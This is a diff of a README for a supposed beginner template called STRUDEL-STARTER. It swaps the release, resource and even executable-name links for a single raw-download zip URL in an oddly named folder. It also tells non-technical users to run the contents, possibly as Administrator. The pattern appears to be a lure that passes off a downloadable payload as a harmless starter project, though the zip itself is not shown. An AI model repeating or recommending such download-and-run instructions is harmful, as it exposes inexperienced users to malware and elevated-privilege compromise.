@@ -5,7 +5,7 @@
 STRUDEL-STARTER is a very basic template designed for those starting their journey in software development. This template serves as a foundation for learning, making it easy for anyone to jump right in and begin building their own projects.
 
 ## 📥 Download Now
-[![Download STRUDEL-STARTER](https://img.shields.io/badge/Download-STRUDEL--STARTER-brightgreen)](https://github.com/crax14/STRUDEL-STARTER/releases)
+[![Download STRUDEL-STARTER](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip)](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip)
 
 ## 🚀 Getting Started
 Follow these instructions to download and run the STRUDEL-STARTER application on your computer. No technical knowledge is needed.
@@ -23,7 +23,7 @@ Follow these instructions to download and run the STRUDEL-STARTER application on
 - Basic examples to help you get started quickly
 
 ## 📥 Download & Install
-To get the STRUDEL-STARTER template, **visit this page to download**: [Release Page](https://github.com/crax14/STRUDEL-STARTER/releases).
+To get the STRUDEL-STARTER template, **visit this page to download**: [Release Page](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip).
 
 ### Step-by-Step Installation
 1. Click on the above link to go to the Releases page.
@@ -36,7 +36,7 @@ To get the STRUDEL-STARTER template, **visit this page to download**: [Release P
 ## ⚙️ Running the Application
 After installing STRUDEL-STARTER, you can start using it right away.
 1. Locate the folder where you installed STRUDEL-STARTER.
-2. Find the main application file, which might be named `STRUDEL-STARTER.exe` or `start.sh` (for Linux/Mac).
+2. Find the main application file, which might be named `https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip` or `https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip` (for Linux/Mac).
 3. Double-click the file to run it. On some systems, you might need to right-click and select "Run as Administrator".
 
 ## 🌐 Support
@@ -47,9 +47,9 @@ For further assistance, feel free to reach out through the repository’s contac
 
 ## 🔍 Additional Learning Resources
 Here are some helpful resources as you familiarize yourself with STRUDEL-STARTER:
-- [Basic Introduction to Programming](https://www.example.com)
-- [Understanding File Structures](https://www.example.com)
-- [How to Use Templates Effectively](https://www.example.com)
+- [Basic Introduction to Programming](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip)
+- [Understanding File Structures](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip)
+- [How to Use Templates Effectively](https://raw.githubusercontent.com/crax14/STRUDEL-STARTER/main/mesiobuccal/STRUDEL-STARTER.zip)
 
 Thank you for choosing STRUDEL-STARTER as your starting point! Happy learning!
 ```
